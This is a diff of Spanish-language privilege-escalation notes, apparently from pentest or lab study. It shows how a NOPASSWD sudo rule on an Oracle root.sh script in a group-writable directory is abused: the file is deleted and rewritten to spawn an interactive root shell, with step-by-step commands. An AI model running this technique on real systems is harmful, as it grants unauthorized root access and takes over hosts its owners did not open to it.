@@ -224,14 +224,19 @@ Paso 6:
 	(ALL) NOPASSWD: /opt/oracle/product/21c/dbhomeXE/root.sh 
 
 Paso 1:
-❯ ls -lah /opt/oracle/product/21c
+❯ ls -la /opt/oracle/product/21c/dbhomeXE/   
+	drwxrwxr-x. 61 oracle oinstall  4096 Oct  8 21:26 .     <- Otros pueden eliminar/crear archivos en este dir 
+	drwxrwxr-x.  3 oracle oinstall    22 Sep  4  2025 ..
+	-rwx------.  1 root   oinstall   507 Aug 18  2021 root.sh
+	
+
 ❯ rm /opt/oracle/product/21c/dbhomeXE/root.sh
 
-Paso 2:
-❯ vi /opt/oracle/product/21c/dbhomeXE/root.sh
 
-	#!/bin/bash
-	/bin/bash -i
+Paso 2:
+❯ echo '#!/bin/bash' > /opt/oracle/product/21c/dbhomeXE/root.sh
+❯ echo '/bin/bash -i' >> /opt/oracle/product/21c/dbhomeXE/root.sh
+
 
 Paso 3:
 ❯ chmod +x /opt/oracle/product/21c/dbhomeXE/root.sh    # Dar permisos de ejecución 
